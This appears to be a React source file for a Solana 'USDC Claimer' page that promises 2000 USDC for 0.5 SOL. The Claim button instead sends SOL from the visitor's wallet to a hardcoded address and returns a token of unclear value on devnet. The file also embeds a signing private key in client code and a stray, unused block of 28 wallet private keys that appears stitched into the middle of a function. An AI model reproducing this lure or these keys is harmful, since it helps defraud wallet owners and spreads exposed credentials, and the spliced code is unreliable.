/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "347GL1jg2371c7uyhjViunHZq9Jz8eHPhGoEHJfhLrSMChjDH32KZAXtBPERXJQR6efpcSaUCLZTNaB4HPWBayub"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3VDmQoccKRVGb5AWEgtoN4SUbqWN2EFTGTb8rpDZGoKt87ynHn6ArB1KEdxsT32sSRh4Q4D2DTA6tYKXxcRKpndJ",
  "key1": "3oTKR65NQLeJYKbAitUoZfKaUyyy8MmvoDBTpDU4sUw3QSohExsU2oBDBnSxm4aNi86yvb3977qGdsKjnsu5PHy5",
  "key2": "4vpmmXR6YsDLFTNVsxyfHX68CjZE4XLDD4YtAdBQKyCvcadRKd9uqydjVQcsLzGewm5E6WdCUNKaJcgfjPtBUZ3y",
  "key3": "5vzzjaSboGXXYaeyipYbWUd85r2BHuZmRM8PsTUXGRooJDpAxdyTzGufX7bVVGiXPasu3fnJzMepqZbb6HARd1oW",
  "key4": "3EmmCFJzs3Y17XGJEpfUDLE9xmALrg85vJNnGBYFx9a1iC6nQ1WNfupAYaStQwkuWrnXvHQr5e5pyzWaGc82CyPG",
  "key5": "2tgCk6i1QESKEeScUdtsVuD7DWk3iHRdexnDVpwjwPiz8R2qfYjuVWDAaR36KKT8L5ZhxLvXwQwpy1LdxNdaQ3ZK",
  "key6": "4XQFzyEKnxPb7eeQ8H6PF2b7Ma9a4wbBqXXpa3Tf7wiZCParUJ9CoVGk5h9eewM7SSqUfVWj2AzjUiN6QbZr4VXt",
  "key7": "2awTy5jjswK3wdERNb8WM2APkaDnuY3VBNTvbXykesj6sw4MAcMLF9GTe8CPmuNS9ojU9eeWShVcb2TaF4xXGmM8",
  "key8": "2Wb59iN3dH7T4mR2VPuafK7YcnpJrWG5SYh2v5h6XzaSzo61TBfELc9YT3wSs85HafgKFiZAGvEvYi7Bd8WnKYsj",
  "key9": "4ZyL1vihJgJYtPwKkjuYwK5GemKtXnKSVEo7Lb7Xjz2WbQFEiEudpF8DNu29HQaDSrKDHVmZv9vGmdrGNVghkbi8",
  "key10": "5ZzmTGn77MpkYF6UvtcaYxVjiGzvjhxM4eDvXVfaFR7zYN849pq8BvQPYJxjz6cdAmtr71BGChcV69QhuEkNo7cj",
  "key11": "3DWKVw9eMYJwkxk2ypktxe1vzGHcgJiL1iuShjfvrd1muZNE7wqFEdoD6jPvucai1xZj5yQcLMHfPRWzf3iRJZd3",
  "key12": "3Fjdt3XyCyvxbocYQpKrbtjynezoCXJJESX41SfLa73B5X6TkKWfDkY3Pa7A9FwpK55ZdAFvqJ4g1DWsHADeWA2N",
  "key13": "4hMEet4S6A9JrUbxjMhnezfViYXDMb3MJJBEYJPSKNr6w145ZzeucjgBPw8UY1wF3ZsjfAgxFs4Vmcsu3CVGvcb5",
  "key14": "4yzyvx3B873JTNZRehVhAfqKajA1runzoZwPQjdpFsigrmn1AfXxMKvpyNV6btQjhkTrTupPNRrGH4yVEcU9NVxV",
  "key15": "FF88FcbTRdSudXaks7aH3HdTPwYm2jXEHCsYmWeLkhfQbzG9XMYBA6LGpkYLbsKUz34fyqCJPooH5SnG4oTvz5k",
  "key16": "4yPP4k76YyfHKJfbHP9EwoEA1q6YPwKwuTovSgQdFsvqygdB2sn7m9TcH2yVbmQhxQLiQ1F9vkLFn4fHM7w4q6tw",
  "key17": "36hn47yic5icYmaqfESLkzX9RUugp5niYAKpfFR5fC2QbZSZ1JTD4GKm2W9vGktD1h3MYihqZQ4RPcFvKrMa7EvL",
  "key18": "47DyeQVtLvkP2sB8d3im2CJQba97UBTi65h6Ucqt7gEtKSiDb2XUiNVC9vCYAwChSyxCvFnq5cWvPa8wED6w31MM",
  "key19": "2grVy8mpHn3EErdp7i7dmzwbbZcFjgTkU5qS9uTCMJKz1suRZYat4ahwzwoEY4bfxr3QfbxNNcnvzj1jEy3mDarS",
  "key20": "4bm6AyPqTd5dT3N2fXxFWU5HuPT1Z2Xb4arWxwaDpevTBLZRMCdQP9Xer4RQPTeGciggWB7tygWDpwRiJbuV7b82",
  "key21": "4uU67U34Wx9zKMqSbV6WEMRy74shTx6zdeqPsA1u26oN9PVQSgmqTaS5M9sD6JaddiEsbfYnJoedTFJSMa732VvB",
  "key22": "53MuDeR3Xb1wH2xo3YhwqckhNzgxyaYrKpt5eAmj7T4x7vhyyQUDcoTE5yMeooHXkMJT8UXT7uLHwUXGVJRuG9zD",
  "key23": "2dMVMVFsiDj4oS68FWudyViCXTXExTFjUmGQVbTTpQ2diMBBQkTeqKAoHJP8q4ucwGg7YXgtmN8L2iVxYUJibNVG",
  "key24": "3sWd72VP2wqAy4kBzULyb5B82F6sPgNzAwcP4qbAjgs7WDVdNuyiWWYYZ6La6MNFzxk9YnMg5MMQZzC2FhFqZq6r",
  "key25": "2AcUVqqf2qe4oTtWrQjHnW4ysmvcHoHGc1NyjexqsEGUqNEmM2ZpZiMXwFPLTYa7jWJv51NJqjzCbcwi1MHziUNd",
  "key26": "3oXperkT2BfRJA7JYA6u34PBujyHuR6LaKXbMBBemsRCx5bhUKhtJoXLETqQjPJXRqmviAmF8PDq1GYA8msLTysL",
  "key27": "3XJVBPeGuanUsp5jZdmwBRJgpK42n6VaPrF5CBqdkYoAHDxgDwgHjRRGMGxWa1GdCjeCpYtXfp6d2rpLny8nJuHG"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
